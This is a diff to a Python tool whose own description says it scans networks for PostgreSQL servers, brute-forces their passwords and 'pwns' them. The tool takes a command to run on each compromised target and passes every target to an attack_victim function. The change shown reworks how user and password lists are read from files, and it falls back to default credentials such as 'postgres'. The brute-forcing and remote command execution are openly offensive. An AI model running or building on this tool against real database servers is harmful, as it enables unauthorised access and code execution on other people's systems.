@@ -123,9 +123,9 @@ def make_query(host, port, user, password, query='SELECT version();'):
 def parse_args():
     parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
     parser.add_argument('targets', metavar='targets', type=str, nargs='*') # nargs='+' if targets is necessary
-    parser.add_argument('--userlist', dest='userlist',
+    parser.add_argument('--userfile', dest='userfile',
                         default=None, help='File with a list of users')
-    parser.add_argument('--passlist', dest='passlist',
+    parser.add_argument('--passfile', dest='passfile',
                         default=None, help='File with a list of passwords')
     parser.add_argument('--command', dest='command',
                         default=None, help='Command to execute on a target machine')
@@ -136,8 +136,22 @@ def parse_args():
 
     args = parser.parse_args()
 
-    args.userlist = args.userlist if args.userlist else ['postgres']
-    args.passlist = args.passlist if args.passlist else ['postgres', 'postgres1']
+    userfile_lines = []
+    passfile_lines = []
+
+    try:
+        for line in list(open(args.userfile)):
+            userfile_lines.append(line.strip())
+    except:
+        userfile_lines = ['postgres']
+    try:
+        for line in list(open(args.passfile)):
+            passfile_lines.append(line.strip())
+    except:
+        passfile_lines = ['postgres', 'postgres1']
+
+    args.userfile = userfile_lines
+    args.passfile = passfile_lines
     args.command = args.command if args.command else ''
     args.port = args.port if args.port else 5432
 
@@ -205,7 +219,7 @@ def main():
     else:
         for target in args.targets:
             for ip, port in parse_target(target, args.port):
-                attack_victim(ip, port, args.userlist, args.passlist, command)
+                attack_victim(ip, port, args.userfile, args.passfile, command)
 
 if __name__ == '__main__':
     main()
